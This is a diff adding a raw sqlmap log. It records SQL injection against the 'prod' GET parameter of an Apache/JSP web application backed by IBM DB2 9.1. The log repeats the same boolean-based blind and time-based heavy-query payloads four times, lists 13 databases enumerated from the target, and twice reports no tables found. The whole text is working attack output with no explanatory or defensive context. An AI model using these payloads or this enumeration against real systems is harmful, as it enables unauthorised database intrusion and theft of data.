@@ -1,0 +1,79 @@
+sqlmap identified the following injection points with a total of 47 HTTP(s) requests:
+---
+Place: GET
+Parameter: prod
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: prod=S7CAC' AND 1571=1571 AND 'lEAf'='lEAf
+    Vector: AND [INFERENCE]
+
+    Type: AND/OR time-based blind
+    Title: IBM DB2 AND time-based blind (heavy query)
+    Payload: prod=S7CAC' AND 8015=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3) AND 'TnZn'='TnZn
+    Vector: AND [RANDNUM]=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3 WHERE ([INFERENCE]))
+---
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: prod
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: prod=S7CAC' AND 1571=1571 AND 'lEAf'='lEAf
+    Vector: AND [INFERENCE]
+
+    Type: AND/OR time-based blind
+    Title: IBM DB2 AND time-based blind (heavy query)
+    Payload: prod=S7CAC' AND 8015=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3) AND 'TnZn'='TnZn
+    Vector: AND [RANDNUM]=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3 WHERE ([INFERENCE]))
+---
+web application technology: Apache, JSP
+back-end DBMS: active fingerprint: IBM DB2 9.1
+available databases [13]:
+[*] "t\xfdtdbu"
+[*] "t\xfdtgvo"
+[*] "t\xfdtjcn"
+[*] "t\xfdtqspd"
+[*] "t\xfdttubu"
+[*] "t\xfdtuppmt"
+[*] "tgqdwqf\xfdq"
+[*] "tgwe\xfdqf\xfdq"
+[*] bto
+[*] ecbenjo
+[*] ovmmje
+[*] rtrmaaa
+[*] trmk
+
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: prod
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: prod=S7CAC' AND 1571=1571 AND 'lEAf'='lEAf
+    Vector: AND [INFERENCE]
+
+    Type: AND/OR time-based blind
+    Title: IBM DB2 AND time-based blind (heavy query)
+    Payload: prod=S7CAC' AND 8015=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3) AND 'TnZn'='TnZn
+    Vector: AND [RANDNUM]=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3 WHERE ([INFERENCE]))
+---
+web application technology: Apache, JSP
+back-end DBMS: active fingerprint: IBM DB2 9.1
+No tables found
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: prod
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: prod=S7CAC' AND 1571=1571 AND 'lEAf'='lEAf
+    Vector: AND [INFERENCE]
+
+    Type: AND/OR time-based blind
+    Title: IBM DB2 AND time-based blind (heavy query)
+    Payload: prod=S7CAC' AND 8015=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3) AND 'TnZn'='TnZn
+    Vector: AND [RANDNUM]=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3 WHERE ([INFERENCE]))
+---
+web application technology: Apache, JSP
+back-end DBMS: active fingerprint: IBM DB2 9.1
+No tables found
